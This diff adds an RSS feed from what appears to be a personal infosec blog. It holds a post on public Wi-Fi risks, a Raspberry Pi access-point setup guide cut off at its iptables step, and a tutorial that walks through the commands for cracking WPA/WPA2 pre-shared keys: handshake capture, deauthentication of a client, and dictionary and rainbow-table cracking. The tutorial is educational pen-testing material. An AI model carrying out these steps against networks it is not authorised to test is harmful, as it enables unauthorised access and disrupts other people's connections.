@@ -1,0 +1,2253 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Jesse P Lesperance</title>
+    <description>Jesse P Lesperance a highly skilled leader in the Information Security space/community.</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Wed, 16 Aug 2023 15:57:28 -0700</pubDate>
+    <lastBuildDate>Wed, 16 Aug 2023 15:57:28 -0700</lastBuildDate>
+    <generator>Jekyll v4.3.2</generator>
+
+    
+      <item>
+        <title>Dangers of using Open and Public Wifi Hotspots</title>
+        <description>&lt;p&gt;Public Wi-Fi networks are a convenient way to stay connected to the internet while on the go. However, using public Wi-Fi can also be risky, as these networks are often unsecured and can leave your personal information vulnerable to hackers and cybercriminals. In this article, we’ll discuss the top 3 risks and dangers of connecting to public Wi-Fi networks and provide some recommendations on how to mitigate those risks.&lt;/p&gt;
+
+&lt;h2 id=&quot;man-in-the-middle-mitm-attacks&quot;&gt;Man-in-the-middle (MITM) attacks&lt;/h2&gt;
+
+&lt;p&gt;A man-in-the-middle attack is a type of cyber attack where a hacker intercepts communication between two parties to steal sensitive information, such as login credentials, credit card numbers, and other personal data. In a public Wi-Fi network, MITM attacks are particularly common because these networks are often unsecured and have no encryption.&lt;/p&gt;
+
+&lt;p&gt;To carry out a MITM attack, a hacker sets up a fake Wi-Fi hotspot that appears to be a legitimate network. When users connect to the fake network, the hacker can intercept all communication and steal sensitive information. MITM attacks can be difficult to detect, as users may not realize that they are connecting to a fake network.&lt;/p&gt;
+
+&lt;h3 id=&quot;how-to-mitigate-the-risks&quot;&gt;How to mitigate the risks:&lt;/h3&gt;
+
+&lt;p&gt;One of the best ways to mitigate the risks of MITM attacks is to use a virtual private network (VPN). A VPN encrypts your data and creates a secure connection between your device and the internet. This makes it much more difficult for hackers to intercept your communication or steal your personal data.&lt;/p&gt;
+
+&lt;p&gt;It’s also important to be cautious when connecting to public Wi-Fi networks. Only connect to networks that require a password or other type of authentication. Avoid connecting to networks that are open and unsecured, as they are much more vulnerable to MITM attacks.&lt;/p&gt;
+
+&lt;h2 id=&quot;malware&quot;&gt;Malware&lt;/h2&gt;
+
+&lt;p&gt;Malware is another common risk associated with public Wi-Fi networks. Malware is malicious software that can infect your device and cause a variety of problems, including stealing personal data, monitoring your activities, and slowing down your device.&lt;/p&gt;
+
+&lt;p&gt;Malware can be easily spread through public Wi-Fi networks, as these networks are often unsecured and have no protection against malicious software. In some cases, malware can be installed on your device without you even realizing it.&lt;/p&gt;
+
+&lt;h3 id=&quot;how-to-mitigate-the-risks-1&quot;&gt;How to mitigate the risks:&lt;/h3&gt;
+
+&lt;p&gt;The best way to mitigate the risks of malware is to use antivirus software on your device. Antivirus software can detect and remove malware from your device, as well as provide real-time protection against future threats.&lt;/p&gt;
+
+&lt;p&gt;It’s also important to be cautious when downloading files or clicking on links when connected to public Wi-Fi networks. Avoid downloading files or clicking on links from unknown sources, as they may contain malware.&lt;/p&gt;
+
+&lt;h2 id=&quot;phishing&quot;&gt;Phishing&lt;/h2&gt;
+
+&lt;p&gt;Phishing is a type of cyber attack where a hacker sends an email or message that appears to be from a legitimate source, such as a bank or social media platform. The message will often contain a link that, when clicked, takes you to a fake website where you are prompted to enter your login credentials or other personal information.&lt;/p&gt;
+
+&lt;p&gt;Phishing attacks can be particularly dangerous when using public Wi-Fi networks, as these networks are often unsecured and leave your personal information vulnerable to cybercriminals. Once hackers have access to your login credentials or personal information, they can use that information to steal your identity or access your financial accounts.&lt;/p&gt;
+
+&lt;h3 id=&quot;how-to-mitigate-the-risks-2&quot;&gt;How to mitigate the risks:&lt;/h3&gt;
+
+&lt;p&gt;One of the best ways to mitigate the risks of phishing attacks is to be cautious when clicking on links or entering personal information online. Always verify that the website you are visiting is legitimate and secure before entering any personal information.&lt;/p&gt;
+
+&lt;p&gt;It’s also important to use strong, unique passwords for all of your online accounts. Avoid using the same password for multiple accounts, as this can make it easier for hackers to gain access to your personal information.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Connecting to public Wi-Fi networks can be risky, as these networks are often unsecured and leave your personal information vulnerable to hackers and cybercriminals. The top three risks and dangers of using public Wi-Fi networks are man-in-the-middle attacks, malware, and phishing. However, by taking precautions such as using a VPN, antivirus software, and being cautious when clicking on links or entering personal information, you can mitigate these risks and protect your online security and privacy.&lt;/p&gt;
+
+&lt;p&gt;Remember to always be cautious when using public Wi-Fi networks and to only connect to networks that are secure and require a password or other type of authentication. By following these recommendations, you can stay connected while protecting your personal information from cyber threats.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 18 Apr 2023 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000/attacking%20wifi/wireless/2023/04/18/dangers-of-public-wifi/</link>
+        <guid isPermaLink="true">http://localhost:4000/attacking%20wifi/wireless/2023/04/18/dangers-of-public-wifi/</guid>
+      </item>
+    
+      <item>
+        <title>Attacking Wifi Series, Part 6&lt;br /&gt;Hacking WPA/WPA2 PSK</title>
+        <description>&lt;p&gt;In this post we are are going to move on to cracking WPA/WPA2 Pre-shared keys using aircrack-ng.  We will show you how to use aircrack-ng by itself, with an airolib-ng database and with John the Ripper to crack WPA/WPA2 passwords&lt;/p&gt;
+
+&lt;p&gt;The primary difference between cracking WEP and WPA/WPA2 is that while statistical methods can be used for speeding up the cracking of WEP pre-shared keys, only brute force can be used for WPA/WPA2 PSK.&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;Although WPA-encrypted networks do not suffer from the same cryptographic vulnerabilities as WEP networks, they can still sometimes be easier to crack due to users picking weak passwords.  The impact of having to use the brute force approach is a substantial impact to efficiency.  A large dictionary can to hours to days to process due to the computational intensity of brute forcing.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Target Information&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;BSSID&lt;/strong&gt;: 34:08:04:09:3D:38&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;AP Channel&lt;/strong&gt;: 3&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;ESSID&lt;/strong&gt;: hitme (WPA2 PSK)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Client&lt;/strong&gt;: 00:18:4D:1D:A8:1F&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;mon0&lt;/strong&gt;: 00:1F:33:F3:51:13&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;initial-attack-setup&quot;&gt;Initial Attack Setup&lt;/h3&gt;
+
+&lt;p&gt;The first step in every attack scenario is to place the wireless interface in &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#monitor-mode&quot;&gt;monitor mode&lt;/a&gt; on the same channel as the access point.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airmon-ng start wlan0 3&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will set &lt;strong&gt;wlan0&lt;/strong&gt; into monitor mode as &lt;strong&gt;mon0&lt;/strong&gt; on channel 3&lt;/p&gt;
+
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+
+&lt;p&gt;Now, an &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#scanning-networks&quot;&gt;Airodump sniffing session&lt;/a&gt; needs to be started and write the capture file to the disk for usage by Aircrack-ng for breaking the WEP key&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airodump-ng -c 3 –bssid 34:08:04:09:3D:38 -w wpa-psk mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will start airodump-ng, listening on Channel 3 and filtering on the BSSID and saving the output to &lt;em&gt;wep1&lt;/em&gt;.  Our goal is to capture the WPA 4-way handshake, which takes place when a wireless client connects and authenticates to the access point.&lt;/p&gt;
+
+&lt;h3 id=&quot;deauthentication-attack&quot;&gt;Deauthentication Attack&lt;/h3&gt;
+
+&lt;p&gt;We could passively capture the WPA handshake by allowing airodump-ng to run until a new wireless client connects and authenticates to our target network.  However, we could use a deauthentication attack on a connected client to speed up the process, which is what we will do here.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;After conducting the attack, you can look in the upper right hand corner of the airodump-ng output and should see the we hopefully captured the complete 4-way handshake.  In the event of not successfully capturing in, we can either re-run the deauthentication attack against the same client or we can run the attack against a different client.&lt;/p&gt;
+
+&lt;h3 id=&quot;preperation&quot;&gt;Preperation&lt;/h3&gt;
+&lt;h4 id=&quot;create-airolib-database-optional&quot;&gt;Create Airolib Database (Optional)&lt;/h4&gt;
+
+&lt;p&gt;Airolib-ng is designed to store and manage ESSID and password lists.  It computes their PMKs and use them to crack WPA and WPA2 passwords.  Since PMKs are reproducable due to the PMK always being the same for a given ESSID and password combination, we are able to pre-compute the PMKs for different combinations and possibly speed up the cracking of the handshake.&lt;/p&gt;
+
+&lt;p&gt;To get started, we need to create a file containing the ESSID of our target network.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;echo hitme &amp;gt; essid.txt&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This enables us to import the new text file into the database&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **airolib-ng &lt;dbName&gt; --import essid essid.txt**&lt;/dbName&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will automatically create the database if it does not exist.&lt;/p&gt;
+
+&lt;p&gt;We can verify this by providing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--stats&lt;/code&gt; operation to airolib-ng&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **airolib-ng &lt;dbName&gt; --stats**&lt;/dbName&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In the output, you should see the ESSID you imported in the ESSID column.  Now we need to import the password file.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **airolib-ng &lt;dbName&gt; --import passwd &lt;wordlist&gt;**&lt;/wordlist&gt;&lt;/dbName&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;You will see output indicating the file is being read, along with how many lines have been imported.&lt;/p&gt;
+
+&lt;p&gt;With all of the data imported, we now need to have airolib-ng all of the corresponding PMKs.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **airolib-ng &lt;dbName&gt; --batch**&lt;/dbName&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;You will see output indicating how many PMKs were generated, the time taken and the generation rate.  This can also be validated with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--stats&lt;/code&gt; operation also.  You will see 100.0 in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Done&lt;/code&gt; column, indicating 100% completion.&lt;/p&gt;
+
+&lt;h4 id=&quot;prepare-john-the-ripper&quot;&gt;Prepare John the Ripper&lt;/h4&gt;
+
+&lt;p&gt;Using a wordlist with John the Ripper will not yield any results that aircrack-ng would render.  For this reason, we will configure JTR to use word mangling.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;nano /etc/john/john.conf&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;At the endo of the section &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;List.Rules.Wordlist&lt;/code&gt;, add the following 2 lines&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;$[a-zA-Z0-9]$[a-zA-Z0-9]
+$[0-9]$[0-9]$[0-9]&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We have added 2 rules.  The first will add to characters on to each word in the wordlist, using only the defined charcter(upper and lowercase letters plus, zero to nine).  The second adds 3 characters all 0-9.&lt;/p&gt;
+
+&lt;h4 id=&quot;cowpatty-rainbow-tables&quot;&gt;coWPAtty Rainbow Tables&lt;/h4&gt;
+
+&lt;p&gt;This is the main purpose behind coWPAtty, to make use of pre-compiled hashes for cracking WPA passwords.  The pre-computed hashes are generated for each unique ESSID.&lt;/p&gt;
+
+&lt;p&gt;For this, we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;genpmk&lt;/code&gt;, a tool included with coWPAtty.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **genpmk -f &lt;wordlist&gt; -d hitme-hashes -s hitme**&lt;/wordlist&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Similar to airolib-ng, genpmk will provide output showing how many passphareses were testing and the total time taken, along with through put.&lt;/p&gt;
+
+&lt;h3 id=&quot;crack-the-wpa-key&quot;&gt;Crack the WPA Key&lt;/h3&gt;
+
+&lt;p&gt;We have the 4-way handshake for the target network.  Let’s look at how to crack this with aircrack-ng and airolib-ng.&lt;/p&gt;
+&lt;h4 id=&quot;wordlist-based-crack&quot;&gt;Wordlist-based Crack&lt;/h4&gt;
+
+&lt;p&gt;Very similar to how we executed a wordlist based crack for WEP, we shall also do for WPA/WPA2&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **aircrack-ng -w &lt;worldlist&gt; wpa-psk-01.cap&lt;/worldlist&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We can analyze the output for aircrack-ng to see whether we were able to crack the WPA PSK or not.&lt;/p&gt;
+
+&lt;h4 id=&quot;airolib-database-based-crack&quot;&gt;Airolib Database-based Crack&lt;/h4&gt;
+
+&lt;p&gt;Aircrack-ng has airolib-ng support built in natively.  we just pass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r&lt;/code&gt; parameter instead of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **aircrack-ng -r &lt;dbName&gt; wpa-psk-01.cap**&lt;/dbName&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In the output, you will notice a substantial increase in the number of keys tested per second.&lt;/p&gt;
+
+&lt;h4 id=&quot;aircrack-ng-with-jtr&quot;&gt;Aircrack-ng with JTR&lt;/h4&gt;
+
+&lt;p&gt;Now that John is configured to mangle words in the wordlist, we can increase our chances of finding the WPA key.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **./john –wordlist=&lt;wordlist&gt; --rules --stdout | aircrack-ng -d hitme -w - wpa-psk-01.cap**&lt;/wordlist&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Despite using JTR, you will see the aircrack-ng output on your screen, not JTR’s output.&lt;/p&gt;
+
+&lt;h4 id=&quot;cowpatty-dictionary-mode&quot;&gt;coWPAtty Dictionary Mode&lt;/h4&gt;
+
+&lt;p&gt;Dictionary mode is not the reason most people use coWPAtty, but it is still a good idea to know how to use it.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **cowpatty -r wpa-psk-01.cap -f &lt;wordlist&gt; -2 -s hitme&lt;/wordlist&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The one thing to note about the command above, is the use of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-2&lt;/code&gt; parameter.  This tells coWPAtty to use non-strict mode since coWPAtty has an issue with Airdump-ng captures.&lt;/p&gt;
+
+&lt;h4 id=&quot;cowpatty-rainbow-tables-mode&quot;&gt;coWPAtty Rainbow Tables Mode&lt;/h4&gt;
+
+&lt;p&gt;Now that we have our handshake and pre-computed hashes, we can now crack the WPA password&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;cowpatty -r wpa-psk-01.cap -d hitme-hashes -2 -s hitme&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;coWPAtty’s output will display the PSK if we were successful.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 04 May 2020 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/</link>
+        <guid isPermaLink="true">http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wpa/wpa2/2020/05/04/hacking-wpa-wpa2-psk/</guid>
+      </item>
+    
+      <item>
+        <title>Setting up a Rasberry Pi as a Wireless AP</title>
+        <description>&lt;p&gt;Whether you are looking to expand your wifi network or want a wifi pen testing lab, it is always good to know how to turn a Raspberry Pi into a wireless access point.&lt;/p&gt;
+
+&lt;h2 id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;#overview&quot;&gt;Overview&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#requirements&quot;&gt;Requirements&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#instructions&quot;&gt;Instructions&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#update-raspbian&quot;&gt;Update Raspbian&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#install-hostapd-and-dnsmasq&quot;&gt;Install hostapd and dnsmasq&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#configure-a-static-ip&quot;&gt;Configure a static IP&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#configure-the-dhcp-serverdnsmasq&quot;&gt;Configure the DHCP server(dnsmasq)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#configure-the-access-point-host-software&quot;&gt;Configure the access point host software&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#setting-up-traffic-forwarding&quot;&gt;Setting up traffic forwarding&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#add-iptables-rule&quot;&gt;Add iptables rule&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#hostapd-sample-configurations&quot;&gt;hostapd sample configurations&lt;/a&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#wep-open-authentication&quot;&gt;WEP Open Authentication&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#wep-pre-shared-key-authentication&quot;&gt;WEP Pre-Shared Key Authentication&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#wpa-psk&quot;&gt;WPA-PSK&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#wpa2-psk&quot;&gt;WPA2-PSK&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#wpa2-enterprise&quot;&gt;WPA2 Enterprise&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;The Raspberry Pi has many various uses.  One of those uses is a Raspberry Pi can be a wireless access point.  Why would someone use a Raspberry Pi as a wireless access point?  Two primary reasons come to mind. First, if you are interested in hacking/pen testing wifi networks, a Raspberry Pi is an efficient access point and makes changing the AP configuration quite efficient.  Second, with using 2 wifi adapters, you can turn it into a range extender for your home or business.&lt;/p&gt;
+
+&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;
+
+&lt;p&gt;There are a few items you will need for doing this project:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Rasberry Pi 3/4&lt;/li&gt;
+  &lt;li&gt;2 usb wireless adapters(Pi3), or 1 usb wireless adapter(Pi4)
+    &lt;ul&gt;
+      &lt;li&gt;If you plan to plug you Pi into ethernet, you can reduce the usb adapter requirement by 1&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;MicroSD card 16GB+ with Raspbian installed&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;instructions&quot;&gt;Instructions&lt;/h2&gt;
+
+&lt;h3 id=&quot;update-raspbian&quot;&gt;Update Raspbian&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get update
+sudo apt-get install
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If any of the packages were updated, we recommend you reboot before proceeding.&lt;/p&gt;
+
+&lt;h3 id=&quot;install-hostapd-and-dnsmasq&quot;&gt;Install hostapd and dnsmasq&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;hostapd&lt;/strong&gt; is a user space daemon for access point and authentication servers.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install hostapd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;dnsmasq&lt;/strong&gt; is a lightweight DNS forwarder and DHCP server.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install dnsmasq
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You will likely be prompted to confirm the install, press &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt; to continue.&lt;/p&gt;
+
+&lt;p&gt;Once both are installed, we need to stop their services from running so that we can edit their configuration.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo systemctl stop hostapd
+sudo systemctl stop dnsmasq
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;configure-a-static-ip&quot;&gt;Configure a static IP&lt;/h3&gt;
+
+&lt;p&gt;For simplicity, I am going to assume this is being used on a home network and we are using the standard home IP addresses, like 10.0.X.X.  Given that assumption, let’s provide the IP address of 10.0.0.10 to either wlan0 or eth0, depending on whether you plan to use wifi or ether for the network connection.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;NOTE: If yoy are planning to use this for wifi hacking, we suggest keeping it off your home network since the configuration will inherently be insecure.&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nano /etc/dhcpcd.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once in the file, add the following to the bottom of the file&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interface wlan0 (or eth0)
+static ip_address=10.0.0.10/24
+denyinterfaces eth0
+denyinterfaces wlan0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Those &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;denyinterfaces&lt;/code&gt; lines at the end are needed to make our bridge work.  Now, save the file and exit.&lt;/p&gt;
+
+&lt;h3 id=&quot;configure-the-dhcp-serverdnsmasq&quot;&gt;Configure the DHCP server(dnsmasq)&lt;/h3&gt;
+
+&lt;p&gt;We need a DHCP server so that we can dynamically distribute network configuration parameters, like IP address, for interfaces and services.&lt;/p&gt;
+
+&lt;p&gt;The default configuration is a bit bloated, so let’s rename the file to something else and create a fresh version&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.old
+sudo nano /etc/dnsmasq.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s edit the file to configure our interface and DHCP IP range:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interface=wlan0
+  dhcp-range=10.0.0.11, 10.0.0.30,255.255.255.0,24h
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;configure-the-access-point-host-software&quot;&gt;Configure the access point host software&lt;/h3&gt;
+
+&lt;p&gt;Let’s open the hostapd config file&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nano /etc/hostapd/hostapd.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This should create a new file, however, if it opens an existing version of the config file, delete the contents before proceeding.&lt;/p&gt;
+
+&lt;p&gt;Let’s add the following into the file:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interface=wlan0
+bridge=br0
+hw_mode=g
+channel=&amp;lt;channel&amp;gt;
+wmm_enabled=0
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=CCMP
+ssid=&amp;lt;network&amp;gt;
+wpa_passphrase=&amp;lt;password&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Make sure to set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;channel&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpa_passphrase&lt;/code&gt; to your desired configuration.  This configuration as you can probably tell is for creating a WPA2 access point.&lt;/p&gt;
+
+&lt;p&gt;Now we need to hell the system the location of the config file.  For that we will do the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nano /etc/default/hostapd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Find the line that starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#DAEMON_CONF=&quot;&quot;&lt;/code&gt; – delete the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; and put the path to the config file we just created/edited:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;setting-up-traffic-forwarding&quot;&gt;Setting up traffic forwarding&lt;/h3&gt;
+
+&lt;p&gt;If you were to connect to the access point now, you would notice that after connecting it would tell you that there is not internet access.  This is because your Pi is not currently configured to forward the traffic it receives via wlan0 over you ethernet connection to your modem/gateway.&lt;/p&gt;
+
+&lt;p&gt;To adjust this, let edit the following file&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nano /etc/sysctl.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Find the line that begins with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#net.ipv4.ip_forward=1&lt;/code&gt;, and delete the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt;, leaving the rest of the line intact.&lt;/p&gt;
+
+&lt;h3 id=&quot;add-iptables-rule&quot;&gt;Add iptables rule&lt;/h3&gt;
+
